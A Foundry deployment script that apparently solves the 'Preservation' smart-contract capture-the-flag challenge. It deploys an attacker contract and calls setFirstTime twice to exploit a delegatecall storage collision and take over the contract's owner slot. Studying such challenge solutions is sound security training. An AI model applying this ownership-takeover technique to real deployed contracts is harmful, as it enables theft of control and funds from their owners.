pragma solidity >=0.4.22 <0.9.0;
import "../lib/forge-std/src/Script.sol";
import "../src/Solutions/PreservationCracker.sol";
import "../src/Challenge/Preservation.sol";
import "../lib/forge-std/src/console.sol";

contract PreservationCrackRunner is Script {
    Preservation preservation;
    PreservationCracker preservationCracker;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        //enter contract address here
        preservation = Preservation(0x07626e494002C0DD5FbCC6Ab41794BBE631D753B);

        preservationCracker = new PreservationCracker();
        preservation.setFirstTime(uint160(address(preservationCracker)));

        // enter owner address here
        preservation.setFirstTime(
            uint160(address(0xec485e125D83C45cdCC734A7386A49ba994dFc1d))
        );

        vm.stopBroadcast();
    }
}
